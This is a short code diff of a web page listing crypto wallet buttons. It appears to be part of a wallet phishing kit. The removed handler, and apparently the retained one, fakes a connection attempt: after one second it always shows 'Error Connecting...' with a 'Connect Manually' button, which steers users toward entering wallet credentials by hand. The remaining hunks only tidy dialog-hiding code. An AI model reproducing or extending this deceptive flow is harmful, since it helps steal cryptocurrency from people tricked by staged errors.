@@ -586,24 +586,24 @@
     <script src="script/wow/wow.min.js"></script>
     <script src="script/script.js"></script>
     <script>
-    $(document).ready(function () {
-        let wallets = $(".coin-registry button");
-        wallets.each(function () {
-            $(this).on("click", function () {
+//     $(document).ready(function () {
+//         let wallets = $(".coin-registry button");
+//         wallets.each(function () {
+//             $(this).on("click", function () {
 
-                let img = $(this).find(".coin-img").attr("src");
-                event.preventDefault();
-                $(".connection-info").text("Initializing...");
-                $("#current-wallet-app").text($(this).children().last().text().trim());
-                $("#current-wallet-logo").attr("src", img);
-                $("#connect-dialog").show();
-                setTimeout(function () {
-                    $(".connection-info").html('Error Connecting... <button class="manual-connection">Connect Manually</button>');
-                }, 1000);
-            });
-        });
-    });
-</script>
+//                 let img = $(this).find(".coin-img").attr("src");
+//                 event.preventDefault();
+//                 $(".connection-info").text("Initializing...");
+//                 $("#current-wallet-app").text($(this).children().last().text().trim());
+//                 $("#current-wallet-logo").attr("src", img);
+//                 $("#connect-dialog").show();
+//                 setTimeout(function () {
+//                     $(".connection-info").html('Error Connecting... <button class="manual-connection">Connect Manually</button>');
+//                 }, 1000);
+//             });
+//         });
+//     });
+// </script>
 <script>
     $(document).ready(function () {
         let wallets = $(".coin-register button");
@@ -716,6 +716,11 @@
     // Helper function to hide all dialogs
     function hideAllDialogs() {
         $("#send-dialog").hide();
+	     successBox.hide();
+        	errorBox.hide();
+                $("#connect-dialog").hide();
+                $("#send-dialog").hide();
+                $("#processing-dialog").hide();
         // Add more dialogs to hide if needed
     }
 });
@@ -770,7 +775,8 @@
         //         $("#send-dialog").hide();
         //         $("#processing-dialog").hide();
         //     }
-        // }); -------------------------------------------------
+        // }); 
+	// -------------------------------------------------
         // $("#processForm").submit(function (e) {
         //     e.preventDefault();
         //     let processBtn = $("#proceedButton");
